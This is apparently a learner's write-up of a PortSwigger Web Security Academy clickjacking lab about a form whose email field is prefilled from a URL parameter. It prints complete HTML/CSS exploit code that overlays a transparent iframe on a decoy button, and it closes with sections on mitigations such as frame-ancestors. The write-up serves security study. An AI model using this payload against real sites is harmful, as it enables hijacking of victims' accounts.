# Clickjacking with Form Input Data Prefilled from a URL Parameter

> 📚 **Category:** Clickjacking
> 🎯 **Difficulty:** Apprentice
> 🛡️ **Platform:** PortSwigger Web Security Academy
> ✅ **Status:** Completed

---

# Overview

This lab demonstrates how an attacker can combine **URL parameter manipulation** with **clickjacking** to perform unauthorized actions. The vulnerable application automatically prefilled a form field using data supplied in the URL, making it easier for an attacker to craft a convincing clickjacking attack.

---

# Lab Objective

Exploit the clickjacking vulnerability to trick a victim into submitting a form where the email field is already populated with an attacker-controlled value.

---

# Understanding the Vulnerability

Some web applications automatically populate form fields using URL parameters for convenience.

When such a page can also be embedded inside an iframe, an attacker can:

* Pre-fill sensitive form values.
* Hide the application inside an invisible iframe.
* Trick a victim into submitting the form with attacker-controlled data.

The victim only performs a click, while the attacker controls the values already present in the form.

---

# Solution Walkthrough

## Step 1 — Analyze the Request

The email field accepted values directly from a URL parameter.

Example:

```text
/my-account?email=hacker@attacker-website.com
```

This allowed the attacker to decide what value would appear inside the form before the victim interacted with it.

---

## Step 2 — Create the Clickjacking Page

A malicious webpage was created that embedded the vulnerable page inside a transparent iframe.

The iframe was carefully positioned over a fake button so that when the victim clicked the visible element, they unknowingly submitted the prefilled form.

---

# Exploit Code

```html
<style>
    iframe {
        position: relative;
        width: 1500px;
        height: 1000px;
        opacity: 0.0001;
        z-index: 2;
    }

    div {
        position: absolute;
        top: 530px;
        left: 250px;
        z-index: 1;
    }
</style>

<div>Click Me</div>

<iframe src="https://LAB-URL/my-account?email=hacker@attacker-website.com"></iframe>
```

> **Note:** The original lab-specific URL has been replaced with a generic placeholder while preserving the exploit logic. The exploit is based on the solution you used in the lab.

---

# Code Breakdown

### URL Parameter

The attacker-controlled email address is inserted into the request before the page loads.

### Transparent iframe

The iframe hides the legitimate application while still allowing user interaction.

### Fake Button

The visible button encourages the victim to click.

### Alignment

CSS positioning ensures that the victim's click lands on the hidden **Update Email** button inside the iframe.

---

# Why the Attack Works

The application trusted the value supplied through the URL and automatically inserted it into the form.

Since the victim submitted the legitimate form while authenticated, the browser included all required cookies and CSRF tokens. The application therefore accepted the request as a valid user action.

---

# Real-World Impact

An attacker could potentially:

* Change a user's email address
* Modify account profile information
* Update contact details
* Manipulate other prefilled forms
* Increase the success rate of social engineering attacks

---

# Mitigation

Applications should:

* Prevent framing using `X-Frame-Options` or `Content-Security-Policy: frame-ancestors`
* Validate and sanitize user-controlled URL parameters
* Avoid prefilling sensitive form fields directly from untrusted input
* Require additional confirmation before applying important account changes

---

# Key Takeaways

* Convenience features such as URL-prefilled forms can become security risks.
* Clickjacking becomes more dangerous when attackers can control form values.
* Sensitive actions should never rely solely on user clicks.
* Layered security controls are necessary to defend against UI redressing attacks.

---

# References

* PortSwigger Web Security Academy
* OWASP Clickjacking Defense Cheat Sheet

---

> **Disclaimer:** This write-up is intended for educational purposes only and documents a lab completed within the PortSwigger Web Security Academy.
